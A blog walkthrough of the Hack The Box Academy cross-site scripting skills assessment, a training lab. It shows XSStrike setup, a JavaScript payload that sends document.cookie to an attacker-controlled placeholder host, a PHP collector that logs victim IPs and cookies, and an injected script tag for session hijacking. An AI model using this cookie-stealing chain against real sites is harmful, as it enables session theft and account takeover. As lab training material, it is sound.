---
layout: post
title:  "Hack The Box - Academy - Cross Site Scripting Skills Assessment"
description: "Develop your Cross-Site Scripting (XSS) expertise with the Hack The Box - Academy - Cross Site Scripting Skills Assessment. Learn how to identify and exploit XSS vulnerabilities."
date:   2024-09-29 18:45
image:  /images/htb/cross-site-scripting/cross-site-scripting-logo.png
tags:   [xss,cbbh]
categories: [htbacademy]
---

### Explore this detailed walkthrough of Hack The Box Academy's Cross Site Scripting module.

><b>Overview:</b>
<br/><br/>
We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new Security Blog. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).<br/><br/>
Start the server below, make sure you are connected to the VPN, and access the /assessment directory on the server using the browser:<br/><br/>
Apply the skills you learned in this module to achieve the following:<br/><br/>
 1 Identify a user-input field that is vulnerable to an XSS vulnerability.<br/>
 2 Find a working XSS payload that executes JavaScript code on the target's browser.<br/>
 3 Using the Session Hijacking techniques, try to steal the victim's cookies, which should contain the flag
<br/>
<b>Links:</b>
<br/>
<a href="https://academy.hackthebox.com/module/103/section/1011">Cross-Site Scripting (XSS)</a><br/>
<a href="https://jacozwarts.github.io/images/htb/cross-site-scripting/Cross_Site_Scripting_Xss_Module_Cheat_Sheet.pdf">Cross-Site Scripting (XSS) - Cheat Sheet</a>
<br/>

#### Installing XSStrike
<a href="https://github.com/s0md3v/XSStrike.git">Clone the XSStrike Repository from GitHub</a>
```
git clone https://github.com/s0md3v/XSStrike.git
```
```
cd XSStrike
pip install -r requirements.txt
```
```
python xsstrike.py -u "http://{TARGET}?id=1"
```


## Q1:  What is the value of the 'flag' cookie?

In this guide, we'll walk through how to extract the 'flag' cookie during the XSS skills assessment using the Hack The Box provided VM. Let's dive in!

#### 1. Set Up the Environment
Start by creating a temporary directory for our script and files. Run the following command to create the directory:
```
mkdir /tmp/tempserver
```
#### 2. Create the JavaScript to Capture the Cookie
Next, we'll write a script (script.js) that will extract the session cookie and send it to a web server we’ll set up shortly. This script will be injected into the vulnerable input fields to capture the cookie.
```
document.location='http://{HTB_VM_IPADDRESS}:{PORT}/index.php?c='+document.cookie;
new Image().src='http://{HTB_VM_IPADDRESS}:{PORT}/index.php?c='+document.cookie;
```
#### 3. Set Up the PHP Server
Now, let's create a PHP file that will handle the incoming requests. This php script will read the c query parameter, which will contain the cookie, and store it in a file called cookies.txt. Here’s the php script:
```
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Use the below command to start your php server:
```
sudo php -S 0.0.0.0:{PORT}
```
You can use any available port. In my case, port 80 was already in use on the Hack The Box Virtual Machine, so I chose an alternate port.
#### 4. Inject the Payload
The next step is to craft a payload to inject into the form. We'll use the following payload for both the comment and website input fields:
```
"><script src=http://{HTB_VM_IPADDRESS}:{PORT}/script.js></script>
```
Replace {HTB_VM_IPADDRESS}:{PORT} with your VM's IP and Port you used when  address.
#### Capture the Flag
Submit the form with the injected payload. Afterward, check the cookies.txt file on your server to retrieve the session cookie. and flag.
<hr/>